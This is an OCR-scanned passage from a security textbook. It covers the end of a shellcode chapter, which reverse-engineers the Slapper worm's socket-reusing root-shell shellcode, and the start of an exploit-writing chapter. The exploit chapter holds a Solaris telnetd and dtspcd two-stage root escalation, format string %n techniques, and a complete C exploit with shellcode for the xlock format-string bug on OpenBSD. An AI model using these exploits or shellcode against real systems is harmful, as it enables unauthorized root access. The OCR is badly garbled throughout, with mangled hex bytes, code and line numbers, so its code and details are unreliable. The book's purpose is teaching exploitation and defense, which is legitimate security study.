"\x0b\xcd\x3D"; 
open(FILE, h>binary.bin")j 
print FILE "Sshellcode"; 
close(FILE); 
Note that the shellcode seems to be cut into three pieces. We execute the script to 
make the binary and then use the ndisasm disassembler, which is part of the nasm 
package, to see the instructions that were used to craft the shellcode.These are shown in 
Example 9.30. 
* * H £ ft E 5 * Example 9.30 Perl slapper.pl 
1 
- b a s h - 2 . 0 5 b $ 
p e r l 
s l a p p e r . p l 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
- b a s h - 2 . 0 5 b $ 
n d i s a s m 
- b 3 2 
0 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 2 
0 0 0 0 0 0 0 4 
0 0 0 0 0 0 0 7 
ODO0O0OA 
0 0 0 0 0 0 0 D 
0 0 0 0 0 0 1 0 
0 0 0 0 0 0 1 2 
0 0 0 0 0 0 1 4 
0 0 0 0 0 0 1 6 
0 0 0 0 0 0 1 8 
0 0 0 0 0 0 1 A 
0 0 0 0 0 0 1 B 
0 0 0 0 0 0 1 D 
0 0 0 0 0 0 1 F 
0 0 0 0 0 0 2 1 
0 0 0 0 0 0 2 3 
0 0 0 0 0 0 2 5 
0 0 0 0 0 0 2 6 
0 0 0 0 0 0 2 8 
O0OD002A 
0 0 0 0 0 0 2 c 
0 0 0 0 0 0 3 0 
0 0 0 0 0 0 3 4 
31DB 
89E7 
8D7710 
8 9 7 7 0 4 
8D4F20 
8 9 4 F 0 8 
B310 
8 9 1 9 
31C9 
BIFF 
8 9 0 F 
51 
3 ICO 
B066 
B307 
89F9 
CDBO 
59 
31DB 
39D8 
750A 
66B81234 
6 6 3 9 4 6 0 2 
7402 
b i : n a r y . 
x o r 
mov 
l e a 
mov 
l e a 
mov 
mov 
mov 
XOE" 
mov 
mov 
b i n 
ebx,ebx 
e d i , e s p 
e s i , ( e d i + 0 x l 0 j 
( e d i + 0 x 4 J , e s i 
ecx,[edi+Ox203 
[edi+0x8],ecx 
bl.OxlO 
[ecx],ebx 
e c x . e c x 
cl.Oxff 
[ e d i ] , ecx 
push ecx 
x o r 
mov 
mov 
mov 
i n t 
p o p 
x o r 
cmp 
j n z 
mov 
cmp 
U 
i 
eax.eax 
al.0x66 
b l , 0 x 7 
e c x , e d i 
0x80 
e c x 
ebx,ebx 
eax,ebx 
0x36 
ax,0x3412 
[ e s i + 0 x 2 ] , a x 
)x38 

414 
Chapter 9 • Writing Shelkode II 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
Ai 
00000036 
00000038 
0000003A 
0000003C 
0000003E 
00000040 
00000042 
00000043 
00000045 
00000046 
00000048 
0000004A 
0000004C 
0000004D 
O00O004E 
00000050 
00000052 
00000054 
00000055 
0000005ft 
0000005F 
00000051 
00000062 
00000063 
00000065 
00000066 
00000068 
nalysis 
E2E0 
89CB 
31C9 
B103 
3 ICO 
B03F 
19 
CD80 
•;i 
E2F6 
31C9 
F7E1 
51 
5B 
B0A4 
CD80 
31C0 
50 
6 8 2 F 2 F 7 3 6 8 
6 8 2 F 6 2 6 9 6 E 
89E3 
50 
53 
89E1 
9? 
BOOB 
CD80 
l o o p 
0 x 1 8 
mov 
e o x , e c x 
x o r 
e c x , e c x 
mov 
c 1 , 0 x 3 
x o r 
e a x . e a x 
mov 
a l r 0 x 3 f 
d e c 
e c x 
int 
0x80 
Inc ecx 
loop 0x3e 
xor 
e c x , e c x 
mul ecx 
push ecx 
pop ebx 
mov a l , 0 x a 4 
In t 3x8 C 
xor 
e a x . e a x 
push eax 
push dword 0xS8732f2f 
push dword 0x6e69622f 
mov e b x , e s p 
push eax 
push ebx 
mov e c x , e s p 
c d q 
mov al rOxb 
i n t 
0x80 
Within the output of the disassembler, we have used boldface to indicate the instructions 
that can be used to identify system calls. The first thing to do is get an idea of what 
system calls are used by the shcllcode. We can then find out the arguments used in the 
system calls and finally make a C version of the shelkode. 
At line 16, 0x66 is moved to AL and at line 20 the kernel is called. In Linux, the 
system call number 0x66 (102) can be used to execute the so eke tea 11 system call, a 
system call that allows several socket functions to be accessed (we used it earlier in this 
chapter). 
In lines 32 and 34, the system call with the number 0x3f (63) is called. This is the 
dup2 system call that can be used to duplicate file descriptors. 
In lines 41 and 42, a system call with the number Ox4a is called.This is the setresuid 
system call and is used to revoke any dropped privileges. 
Finally, at lines 52 and 53, the execve system call is executed.This is probably used to 
spawn a shell. 
At this point, we know that the shellcode uses tbe following four system calls: 
• 
socketcall() 
• 
dup20 
• 
setresuidO 
• 
execve0 

Writing Shelkode II • Chapter 9 
415 
The last three look very common for port binding shelkode that reuses an existing 
network socket but what about socketcallO? Let's have a look at the four pieces of code 
in which the found system calls are used, beginning with the socket call. 
Socketcall is an interface to several socket functions. The first argument of socketcall, 
which is stored in EBX contains the identifier of the function that needs to be used. In 
the code we see that the value 0x7 is put in EBX at line 17, right before the kernel is 
called.This means that the getpeername function is being used.The second argument of 
the socket call is a pointer to the arguments that have to be given to the function 
defined in the first argument. 
The getpeername function returns the name of a peer to which a socket is con-
nected. It requires three arguments. The first argument is a socket file descriptor. The 
second is a pointer to a iockaddr structure and the third is the size of the structure. 
The arguments are initialized at lines 5 through 10 and the address of the arguments 
are loaded in the E C X register at line 18. Note that at line 12, E C X (which represents 
the file descriptor for the getpeername function) is initialized with 255. 
After the socket call is executed, the return value is compared with 0. If it is not the 
same, a jump is made to line 36 where a loop takes the value in ECX, decrements it by 
one, and then jumps to line 13. If the return value is 0 and the port value of the sockaddr 
structure is 0x3412, a small jump over the loop at line 27 occurs. 
So basically what happened here is that a loop checks whether file descriptors 0 
through 255 exist and whether they represent a socket. Examining the outcome of the 
getpeername function does this. If the file descriptor is a socket, the function returns 0. 
If the file descriptor isn't a socket, —1 is returned. 
We are now at a point in the code where the dup2 is executed on the socket.This 
piece of the code, which starts at line 28 and ends on line 36, is pretty much the same as 
what we have seen in the previous shelkode examples. Within a small loop, the stdin, 
stdout, and stderr file descriptors are duplicated with the socket. 
Once this is done, the setresuid function is executed with three zeroes as an argu-
ment.This attempts to set the real, effective, and saved user ID to zero, which is the user 
ID of root on most systems. 
Finally, the execve executes the string that is pushed at lines 45 and 46, which repre-
sent /bin/sh. 
If we translate the assembly code based on our findings to pseudo-code, it looks like 
the following: 
file_descriptors = 255; 
fort I = 255; I > 
0; I--( { 
call_args = I + peerstruct + sizeof(peerstruct}; 
if (socketcallP.&callargs) == 0) { 
if(peerstruct .port == 0x3412) { 
goto finish; 
) 
I 
) 

416 
Chapter 9 • Writing Shellcode II 
% 
finish: 
tmp = 3; 
dupf unc: 
tmp 
; 
d u p 2 ( I , tmp); 
loop dupfunc i f tmp != 0 
setresuid!0.0,0) 
execve(/bin/sh/,{'/bin/shh,01,0); 
The first large part of the shellcode searches for a socket file descriptor that matches 
with the port 0x3412. If it finds one, stdin, stdout, and stderr are dup'ed with the socket, 
setresuid is called and a shell is spawned via execve. The code that seeks the socket origi-
nates from a document that was released by the Last Stage Delerium project and is called 
the findsck shellcode.You can read their document at this location: www.lsd-pl.net/doc-
uments/asmcodes-1.0.2.pdf. 
In summary, reverse engineering shellcode is possible, and to do it in this scenario you 
created to search for int OxSO's and to find out what the system call numbers. Once the 
system call numbers are identified, you must determine what arguments were used in the 
system calls.Then get the whole picture by trying to understand the extra assembly that is 
used in addition to the system calls (for example, the loops in our shellcode). 
Summary 
The best of the best shellcode can be written to execute on multiple platforms while 
still being efficient code. Such OS-spanning code is more difficult to write and test; 
however, shellcode created with this advantage can be extremely useful for creating 
applications that can execute commands or create shells on a variety of systems, quickly. 
The Slapper example analyzes the actual shellcode utilized in the infamous and quite 
malicious Slapper worm that quickly spread throughout the Internet in mere hours. 
finding and exploiting vulnerable systems. Through the use of this shellcode when 
searching for relevant code and examples, it became quickly apparent which ones we 
could utilize. 
Solutions Fast Track 
Shellcode Examples 
0 
Shellcode must be written for different operating platforms; the underlying 
hardware and software configurations determine what assembly language must 
be utilized to create the shellcode. 
www.syngress.com 

Writing Shellcode II * Chapter 9 
417 
0 In order to compile the shellcode, you have to install nasm on a test system. 
nasm allows you to compile the assembly code so you can convert it to a string 
and have it used in an exploit. 
0 The file descriptors 0, 1, and 2 are used for stdin, stdout, and stderr, 
respectively. These are special file descriptors that can be used to read data and 
to write normal and error messages. 
0 The execve shellcode is probably the most used shellcode in the world.The 
goal of this shellcode is to let the application into which it is being injected 
run an application such as /bin/sh. 
0 
Shellcode encoding has been gaining popularity. In this technique, the exploit 
encodes the shellcode and places a decoder in front of the shellcode. Once 
executed, the decoder decodes the shellcode and jumps to it. 
Reusing Program Variables 
0 
It is very important to know that once a shellcode is executed within a 
program, it can take control of all file descriptors used by that program. 
0 
One major drawback of reusing program variables is that the exploit will only 
work with the same versions of the program that have been compiled with the 
same compiler. For example, an exploit reusing variables and written for a 
program on Red Hat Linux 9.0 probably won't work for the same program on 
Red Hat 6.2. 
OS-Spanning Shellcode 
0 
The main advantage of using shellcode that runs on multiple OSs is that you 
only have to use one shellcode array in your exploit so that payload, except for 
length and re turn addresses, will always be the same. 
0 
The main disadvantage of multi-OS shellcode is that you will always have to 
determine on what operating system your shellcode is executed. 
0 To hud out whether your shellcode is executed on a BSD or Linux system is 
fairly easy. Just execute a system call that exists on both systems but that 
performs a completely different task and then analyze the return value. 
Understanding Existing Shellcode 
0 
Disassemblers are extremely valuable tools that can be utilized to assist in the 
creation and analvsis of custom shellcode. 
www.syngress.com 

418 
Chapter 9 • Writing Shellcode II 
0 
nasm is an excellent tool available for creating and modifying shellcode with its 
custom 80x86 assembler. 
Links to Sites 
i 
www.applicationdefense.cotn Application Defense has a solid collection of 
free security and programming tools, in addition to a suite of commercial tools 
given to customers at no cost. 
http://shellcode.org/Shellcode/ Numerous example shellcodes are pre-
sented, some of which are well documented. 
http://nasm.sourceforge.net nasm is an 80xH6 assembler designed 
for portability and modularity It supports a range of object file formats, 
including Linux a.out and ELF, CX)FF, Microsoft 16-bit OBJ, and Win32. It's 
released under the LGPL license. 
Mailing Lists 
* 
SecurityFocus.com All of the mailing lists at securityfocus.com, which is 
owned by Symantec, are excellent resources for up-to-date threat, vulnerability, 
and exploit data. 
Bugtraq@securityfocus.com 
Focus-MS@securityfocus.com 
Peii-Test@securityfocns.coni 
www.syngress.com 

Writing Shellcode II * Chapter 9 
419 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQsatlTFAQnet.com. 
Q: Do the FreeBSD examples shown in this chapter also work on other BSD sys-
tems? 
A: Most of them do. However, the differences between the current BSD distribu-
tions are getting more significant. For example, if you look to the available sys-
temcalls on OpenBSD and FreeBSD, you will find many system calls that aren't 
implemented on both. In addition, the implementation of certain systemcalls dif-
fers a lot on the BSDs. So, if you create shellcode for one BSD, don't automati-
cally assume it will work on another BSD. Test it first. 
Q: Can an IDS detect polymorphic shellcode? 
A: Several security vendors are working on or already have products that can detect 
polymorphic shellcode. However, the methods they use to do this are still very 
CPU-consuming and therefore are not often implemented on customer sites. So 
encoded and polymorphic shellcode will lower the risk that shellcode is picked 
up by an IDS. 
Q: If I want to learn more about writing shellcode for a different CPU than Intel, 
where should I start? 
A: First try to find out if there are any tutorials on the Internet that contain 
assembly code examples for the CPU and operating system you'd like to write 
shellcode for. Also, see if the CPU vendor has developer documentation avail-
able. Intel has great documents that go into much detail about all kinds of CPU 
functionality that you may use in your shellcode. Then get a list of the system 
calls available on the target operating system. 
Q: Can I make FreeBSD/Linux shellcode on my Windows machine? 
www.syngress.com 

420 
Chapter 9 • Writing Shellcode II 
A: Yes.The assembler used in this chapter is available for Windows and the output 
doesn't differ if you run the assembler on a Windows operating system or on a 
Unix one. nasm Windows binaries are available at the nasm Web site at 
http://nasm.sf.net. 
Q: Is it possible to reuse functions from an ELF binary? 
A: Yes, but the functions must be located in an executable section of the program. 
The ELF binary is split into several sections. Ones' read in memory, and not all 
sections have execute permission. So if you want to reuse code from an ELF 
binary program, search for usable code in executable program segments using the 
readelf utility. If you want to reuse a very large amount of data from the program 
and it's located in a readonly section, you could write shellcode that reads the 
data on the stack and then jumps to it. 
Q: Can I spoof my address during an exploit that uses reverse port binding shell-
code? 
A: It would be hard if your exploit has the reverse shellcode. Our shellcode uses 
TCP to make the connection. If you control a machine that is between the 
hacked system and the target IP that you have used in the shellcode, then it 
might be possible to send spoofed TCP packets that cause commands to be exe-
cuted on the target.This is extremely difficult, however, and in general you 
cannot spoof the address used in the TCP connect back shellcode. 
www.syngress.com 

Chapter 10 
Writing Exploits I 
Solutions in this Chapter: 
• 
Targeting Vulnerabilities 
• 
Remote and Local Exploits 
• 
Format String Attacks 
• 
TCP/IP Vulnerabilities 
• 
Race Conditions 
Related Chapters: Chapter 11, Chapter 12, 
Chapter 13, Chapter 14 
El Summary 
El Solutions Fast Track 
El Frequently Asked Questions 
421 n

422 
Chapter 10 * Writing Exploits I 
Introduction 
Writing exploits and finding exploitable security vulnerabilities in software first involves 
understanding the different types of security vulnerabilities that can occur. Software vul-
nerabilities that lead to exploitable scenarios can be divided into several areas.This 
chapter focuses on exploits, including format string attacks and race conditions, while 
the next chapter details more common and vast vulnerabilities such as overflows. 
The process of writing exploits is valuable to both researchers and end-user organi-
zations. By having an exploit for a vulnerability, you can quickly demonstrate to upper 
management the impact of that vulnerability. 
Targeting Vulnerabilities 
Writing exploits first involves identifying and understanding exploitable security vulner-
abilities. This means an attacker must either find a new vulnerability or research a public 
vulnerability. Methods of finding new vulnerabilities include looking for problems in 
source code, sending unexpected data as input to an application, and studying the appli-
cation for logic errors. When searching for new vulnerabilities, all areas of attack should 
be examined, including: 
• 
Is source code available? 
• 
How many people may have already looked at this source code or program, 
and who are they? 
• 
Is automated vulnerability assessment fuzzing worth the time? 
• 
How long will it take to set up a test environment? 
If setting up an accurate test environment will take three weeks, your time is likely 
better spent elsewhere. However, other researchers have probably thought the same thing 
and therefore it might be the case that no one has adequately looked for exploitable 
bugs in the software package. 
Writing exploits for public vulnerabilities is a lot easier than searching for new ones 
because a large amount of analysis and information is readily available. Then again, often 
by the time the exploit is written, any target site of value is already patched. One way to 
capitalize on public vulnerabilities, however, is to monitor online CVS (concurrent ver-
sions system) logs and change requests for open source software packages. If a developer 
checks in a patch to server.c with a note saying "fixed malloc bug" or "fixed two integer 
overflows," it is probably worth looking into what the bug really means. OpenSSL, 
OpenSSH, FreeBSD, and OpenBSD all posted early bugs to public CVS trees before the 
public vulnerabilities were released. 
It is also important to know what type of application you are going after and why. 
Does the bug have to be remote? Can it be client-side (that is, does it involve an end 
user or client being exploited by a malicious server)? The larger the application, the 
higher the likelihood that an exploitable bug exists somewhere within it. If you have a 
specific target in mind, your time is probably best spent learning every function, pro-

Writing Exploits I • Chapter 10 
423 
tocol, and line of the application's code. Even if you don't find a bug, if someone else 
does, you'll have an edge at writing an exploit faster. With a target already in mind, 
you'll most likely beat other people searching for random vulnerable systems. 
After choosing the application, check for all classes of bugs or at least the major, 
high-risk classes such as stack overflows, heap corruption, format string attacks, integer 
bugs, and race conditions.Think about how long the application has been around and 
determine what bugs have already been found in the application. If a small number of 
bugs have been found, what class of bugs are they? For instance, if only stack overflows 
have been found, try looking for integer bugs first because whoever found bugs before 
probably found the easiest stack overflows first. Also try comparing the bug reports for 
the target application to competitors applications; you may find very similar vulnerabili-
ties between the two. 
Now that we have some perspective on identifying vulnerabilities, let's take a closer 
look at exploits, beginning with the uses of remote and local exploits. 
Remote and Local Exploits 
If an attacker wants to compromise a server that he or she does not already have at least 
some sort of legitimate access to (console access, remote authenticated shell access, or 
similar access), then a remote exploit is required. Without remote privileged access to a 
system, local vulnerabilities cannot be exploited. 
Vulnerabilities either exist in a network-based application such as a Web server or a 
local application such as a management utility. While most of the time, separate, local, 
and remote vulnerabilities are sometimes exploited consecutively to yield higher privi-
leges, frequently the services that are exploited by remote exploits do not run as root or 
SYSTEM. For example, services such as Apache, IIS, and OpenSSH run under restricted 
non-privileged accounts to mitigate damage if the service is remotely compromised. 
Local exploits therefore are often necessary to escalate privileges. 
For instance, if an attacker compromises an Apache Web server, he or she will most 
likely be logged in as user apache, www, or some similarly named non-root user. 
Privilege escalation through local exploits, kernel bugs, race conditions, or other bugs 
can allow the attacker to change from user apache to user root. Once the attacker has 
root access, he or she has far more freedom and control of the system in question. 
Remotely exploiting a recent vulnerability in Apache under OpenBSD yielded 11011-
root privileges, but when combined with a local kernel vulnerability (select system call 
overflow), root privileges were obtained. We refer to this combined remote-local exploit 
as a two-step or two-staged attack. 
Example 10.1 shows a two-staged attack. In the first stage, a remote heap overflow 
in Sun Solaris is exploited. Most remote vulnerabilities are not this easy to exploit; how-
ever, it paves the way for atypically easy local privilege escalation as well. Unfortunately, 
bugs like these aren't too common. 

424 
Chapter 10 * Writing Exploits I 
•'""t"^ Example 10.1 A Two-Stage Exploit 
^ ^ ^ 9 kt mote exploitation •• 
in Solaris telnetd 
1 
% t e l n e t 
2 
telnet> environ define TTYPROMPT abedef 
3 
telnet> open localhost 
4 
b i n 
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c 
c
c
c
c
c
c
c
c
c
c
c
o
c
c
c
c
c
c
c
c
c
c
c
c
c 
5 
$ whoami 
6 
bin 
Local privilege escalation to root access on Solaris 
7 % grep dtsped /etc/inetd.conf 
8 dtsped stream tcp wait root /usr/dt/dtsped dtsped 
9 
% Is -1 /usr/dt/dtsped 
10 
20 -rwxnrar-x 
root 
bin 
20032 Jun 26 1999 /usr/dt/dtsped 
11 % cp 
/usz/at/dtsped /usr/dt/dtspcd2 
12 * rm /usr/dt/dtsped 
13 % op /bin/sh /usr/dt/dtsped 
14 % telnet localhost 6112 
15 Trying 127.0.0.1^ 
16 Connected to localhost. 
17 Escape character is 
•
r t ] • . 
18 
id; 
19 
uid=£Hroot> gid=01root) 
Analysis 
After the heap overflow depicted in lines 1 through 6 occurs, the remote attacker is 
granted rights of user and group "bin". Since /usr/dt/dtsped is writeable by group bin, 
this file may be modified by the attacker. Interestingly enough, this file is called by inetd 
and therefore the application dtsped runs as root. So the attacker, after making a backup 
copy of the original dtsped, copies /bin/sh to /usr/dt/dtsped. The attacker then telnets 
to the dtsped port, port 6112, and is thus logged in as root. Here the attacker executes 
the command id (followed by a terminated ";") and the command id responds with the 
uid and gid of the attacker's shell—in this case, root. 
Format String Attacks 
Format string attacks started becoming prevalent in the year 2000. Previous to this, 
buffer overflows were the main security bug out there. Many were surprised by this new-
genre of security bugs, as it destroyed OpenBSD's record of two years without a local 
root hole. Unlike buffer overflows, no data is being overwritten on the stack or heap in 
large quantities. Due to some intricacies in stdarg (variable argument lists), it is possible 
to overwrite arbitrary addresses in memory. Some of the most common format string 
functions include printf, sprintf. fprintf, and syslog. 
Format Strings 
Format strings are used commonly in variable argument functions such as printf, fprintf, 
and syslog. These format strings are used to properly format data when outputted. 
Example 10.2 shows a program with a format string vulnerability. 

Writing Exploits I • Chapter 10 
425 
"'"""' Example 10.2 Example of a Vulnerable Program 
1 
i*include <stdio.h> 
2 
3 
int main(int argc, char **argv) 
4 { 
5 
int number = 5; 
6 
7 
printf(argvtl]}; 
8 
putchar f•\n"J; 
9 
printf ("number t%p) is equal to %d\n" , lvalue, value) -t 
10 } 
Analysis 
Take a look at the statement on line 7. If you are familiar with the printf function, you 
will notice that no formatting characters were specified. Since no formatting was speci-
fied, the buffer argument is interpreted and if any formatting characters are found in the 
buffer, they will be appropriately processed. Let's see what happens when we run the 
program. 
1 £ gcc -o example example. c 
2 $ ./example testing 
3 testing 
4 number (0xbffffc28) is equal to 5 
5 $ ./example AAAA%x%x%x 
6 
bffffc3840049fl340135e4341414141 
7 number (Oxbffffcl8) is equal to 5 
8 $ 
9 
The second time we ran the program, we specified the format character %x which 
prints a four-byte hex value.The outputs seen are the values on the stack of the pro-
grams memory.The 41414141 are the four A characters we specified as an argument. 
These values that we placed on the stack are used as arguments for the printf function 
on line 7 in Example 10.2. So as you can see, we can dump values of the stack, but how 
can we actually modify memory this way? The answer has to do with the %n character. 
While most format string characters are used to format the output of the data such 
as strings, floats, and integers, another character allows these format string bugs to be 
exploited. The format string character %n saves the number of characters outputted so 
far into a variable: Example 10.3 shows how to use it. 
Example 10.3 Using the %n Character 
1 
printf fhello%n\n"H 
^number) 
2 
printf("hello%100d%n\n", 
1, Sinumber) 
Analysis 
In line 1, the variable number will contain the value 5 because of the number of charac-
ters in the word "hello." The %n format string does not save the number of characters in 
the actual printf line, but instead saves the number that is actually outputted. Therefore, 
the code in line 2 will cause the variable number to contain the value 105—for the 
number of characters in hello plus the % 1 Odd. 

426 
Chapter 10 * Writing Exploits I 
Since we can control the arguments to a particular format string function, we can 
cause arbitrary values to be overwritten to specified addresses with the use of the %n 
format string character. To actually overwrite the value of pointers on the stack, we must 
specify the address to be overwritten and use %n to write to that particular address. Let's 
try to overwrite the value of the variable number. First, we know that when invoking the 
vulnerable program with an argument of the length of 10, the variable is located at 
OxbfffFdS on the stack. We can now attempt to overwrite the variable number. 
1 
$ ./example 'printf "\xl8\xfc\xff\xbf""%x%x%n 
2 
bffffc3840049fl840135e48 
3 number (OxbffffclS) is equal to 10 
4 | 
5 
As you can see, the variable numbemow contains the length of the argument speci-
fied at runtime. We know we can use %n to write to an arbitrary address, but how can 
we write a useful value? By padding the buffer with characters such as %.lOOd, we can 
specify large values without actually inputting them into the program. If we need to 
specify small values, we can break apart the address that needs to be written to and write 
each byte of a four-byte address separately. 
For example, if we need to overwrite an address with the value of 0xbfffif710 (-
1073744112), we can split it into a pair of two-byte shorts. These two values—Oxbrffand 
0xf710—are now positive numbers that can be padded using the %d techniques. By per-
forming two %n writes on the low half and high half of the return location address, we 
can successfully overwrite it. When crafted correctly and the shellcode is placed in the 
address space of the vulnerable application, arbitrary code execution will occur. 
Fixing Format String Bugs 
Finding and fixing format string bugs is actually quite simple. Format string bugs are pre-
sent when no formatting characters are specified as an argument for a function that utilizes 
va_arg style argument lists. In Example 10.2, the vulnerable statement was printffeagvfl]). 
The quick fix for this problem is to place a "%s" instead of the argv(lj argument.The cor-
rected statement looks like printf("%s", argv[l]). This does not allow any format string 
characters placed in argvfl] to be interpreted by printf. In addition, some source code scan-
ners can be used to find format string vulnerabilities with ease. The most notable one is 
called pscan (www.striker.Ottawa.on.ca/~aland/pscan/), which searches through lines of 
source code for format string functions that have no formatting specified. 
Format string bugs are caused by not specifying format string characters in the argu-
ments to functions that utilize the vaarg variable argument lists.This type of bug is 
unlike buffer overflows in that no stacks are being smashed and no data is getting cor-
rupted in large amounts. Instead, the intricacies in the variable argument lists allow an 
attacker to overwrite values using the %n character. Fortunately, format string bugs are 
easy to fix, without impacting application logic, and many free tools are available to dis-
cover them. 

Writing Exploits I * Chapter 10 
427 
If f H % ft E i * 
Case Study: xlockmore User-Supplied 
Format String Vulnerability CVE-2000-0763 
A format string vulnerability exists in the xlockmore program written by David Bagley. 
The program xlock contains a format string vulnerability when using the —d option of 
the application. An example of the vulnerability follows: 
1 $ xlock -d %x%x%x%x 
2 xlock: unable to open display d£bfd958402555elea748dfbid953dfbfd654 
3 i 
Due to the fact that xlock is a setuid root on OpenBSD, gaining local root access is 
possible. Other Unixes may not have xlock setuid root, therefore they won't yield a root 
when exploited. 
Vulnerability Details 
This particular vulnerability is a simple example of a format string vulnerability using 
the syslog function. The vulnerability is caused by the following snippet of code: 
1 
l i t defined! HAVE„SYSLOG_H ) 
k& defined! USE_SYSLOG ) 
2 
extern Display *dsp; 
3 
4 
syslog(SYSLOG_WARNINGH buf); 
5 
if (Jnolock} { 
6 
if (strstrtbuf, "unable to open display J == NULL) 
7 
syslogStop(XDisplayStringfdsp)) ; 
8 
closelog{}j 
9 
) 
10 (else 
11 
(void) fprintftstderr, buf); 
12 
#endif 
13 
e x i t ( l ) ; 
14 
} 
Two functions are used incorrectly, opening up a security vulnerability On line 4, 
syslog is used without specifying format string characters. A user has the ability to supply 
format string characters and cause arbitrary memory to be overwritten.The same 
problem lies on line 1 l.Tbe fprintf function also fails to specify format string characters. 
Exploitation Details 
To exploit this vulnerability, we must overwrite the return address on the stack using the 
%n technique. Sinan Eren wrote an exploit for this vulnerability on OpenBSD. The code 
follows: 
|77HT777J| 
' 
#include <stdio.h> 
3 
char bsd_shelIcode[3 = 
4 
-\x31Vxc0\x50\x50\xb0\xmxcd\x8OV/ setuidtO) 
5 
-\x31\xc0\x50\x50\xb0\xb5\xcd\x8OV/setgid(0l 
6 
-\xeMxl6\x5e\x31\xc0\x8d\xOe\x39" 
7 
"\x4e\x08\x89\x46\x0c\x8d\x4e\x08" 
8 
"\x5O\xSl\xS6\xS0\xb0\x3b\xcd\x3O" 
9 
'\xe8\xe5\xff\xff\xf£/bin/sh"; 

Chapter 10 * Writing Exploits I 
10 
1 1 struct platform { 
12 
char *name; 
13 
unsigned short count; 
14 
unsigned long dest_addr; 
1 5 
unsigned long shell_addr; 
1 6 
char *shellcode; 
17 
), 
18 
19 struct platform targets[3] • 
20 i 
21 
{ "OpenESD 2.6 i386 
", 246, 0xdfbfd4a0, OxdfbfddeO, bsd_shellcoae }, 
22 
( "OpenBSD 2.7 i386 
", 246. Oxaabbccdd, Oxaabbccdd, bsd_shellcode }. 
23 
{ NULL, 0, 0, 0, NULL } 
24 
}; 
25 
26 
char jmpcode(129] ; 
27 
char fmt_string[2000] ; 
28 
29 
char *args[] = { "xlock"„ "-display", fmt_string, HULL }; 
30 
char *envs[] = { jmpcode, HULL >; 
31 
32 
33 
int main(int argc, char *argv[]) 
34 f 
35 
char *p; 
36 
int YL, len = 0; 
37 
struct platform *target; 
38 
unsigned short low, high; 
39 
unsigned long shell_addr[2] , dest_addr[2]; 
40 
41 
42 
target = & targets [0] ; 
43 
44 
memset(jmpcode, 0x90, sizeof(jmpcode)); 
45 
strcpy(jmpcode + sizeof(jmpcode) - strlen(target-^shellcode), target-^shellcode); 
46 
47 
shell_addr[0) = (target;->shell_addr & 0xff£f0000) ;•:> 16; 
48 
shell_addr[l] = 
target->shell_addr fc Oxffff; 
49 
50 
memset f fmt_String, 0x00, sizeof (frnt_Stringl ) ; 
51 
52 
for (x = 17; x < target->count; x++) { 
53 
strcat (fjnt_string, 
"%8x") ; 
54 
len += 8; 
55 
} 
56 
57 
if [shell_addr[l] > shell_addr[0]J { 
58 
dest_addr[0] = target->dest_addr+2; 
59 
dest_addr LI] = target->dest_addr; 
60 
low 
= shell_addr[0] - len; 
61 
high = shell_addr[1] - low - len; 
62 
} else C 
63 
dest_addr[0] = target->dest_addr; 
64 
dest_adtfr[l] = target->dest_addr+2; 
65 
low 
= shell_addr[1] - len; 
66 
high = shell_addr[0J - low - len; 

Writing Exploits I • Chapter 10 
429 
67 
) 
68 
69 
*(long 
70 
'(long 
71 
'(long 
72 
*(long 
73 
Mlong 
74 
75 
76 
p = fmt_string •+ strlen(fmt_string) ; 
77 
sprintflp, "%%%dd%%hn%%%dd%%hn", low, high); 
78 
79 
execvel" /usr/XHR6/bin/xlock", args, envs); 
80 
81 } 
Analysis 
In this exploit, the shellcode is placed in the same buffer as the display and the format 
strings are carefully crafted to perform arbitrary memory overwrites. This exploit yields 
local root access on OpenBSD. 
On lines 49 and 50, the address where the shellcode resides is split and placed into 
two 16-bit integers. The stack space is then populated in lines 54 through 57 with %08x, 
which enumerates the 32-bit words found on the stack space. Next, the calculations are 
performed by subtracting the length from the two shorts in order to get the value used 
for the %n argument. Lastly, on lines 71 through 76, the destination address (address to 
overwrite) is placed into the string and executed (line 81). 
TCP/IP Vulnerabilities 
The reason we can determine the operating system of a particular machine on a net-
work is because each implementation of the TCP/IP stack is unique. We are able to dis-
cern between different operating systems by certain characteristics such as advertised 
window size and TTL values. Another aspect of network stack implementations is the 
random number generation used by fields such as the IP id and TCP sequence number. 
These implementation-dependent fields can introduce certain types of vulnerabilities on 
a network. While many network stack types of vulnerabilities result in denial of service, 
in certain cases, one may be able to spoof a TCP connection and exploit a trust relation-
ship between two systems. 
Aside from denial of service, the most prominent security problem in network stack 
implementations is the random number generator used when determining TCP 
sequence numbers. Some operating systems base each sequence number on the current 
time value, while others increment sequence numbers at certain intervals. The details 
vary, but the bottom line is that if the numbers are not chosen completely randomly, the 
particular operating system may be vulnerable to a TCP blind spoofing attack. 
The purpose of a TCP spoofing attack is to exploit a trust relationship between two 
systems.The attacker must know in advance that host A trusts host B completely.The 
attack works like this: An attacker sends some SYN packets to a target A system to start 
* ) i f m t _ s t r i n g [ 0 1 = 
0x41; 
*>&fmt_string[ll 
= 0x11111111; 
M&fmt_string[5] 
= desc_addr[0] ; 
*)&fmt_sering[9] 
= 0x11111111; 
M&fmt_string[13] = dest_addr[ 1 ] ; 

430 
Chapter 10 * Writing Exploits I 
to understand how the sequence numbers are being generated. The attacker then begins 
denial of service to host B in order to prevent it from sending any RST packets. The 
TCP packet is spoofed from host 13 to host A with the appropriate sequence numbers. 
The appropriate packets are then spoofed until the attacker's goal is accomplished (e-
mailing password files, changing a password on the machine, and so on). One note about 
this blind attack is that the attacker will never see any responses actually sent from host A 
to host B. 
While TCI-* blind spoofing was a problem years ago, most operating systems now use 
completely random sequence number generation when determining the sequence num-
bers. The inherent vulnerability still exists in TCP itself, but the chances of completing 
an attack successfully are very slim. Some interesting research by Michael Zalewski goes 
further into understanding the patterns in random number generation 
(http://razor.bindview.com/publish/papers/tcpseq.htnil). 
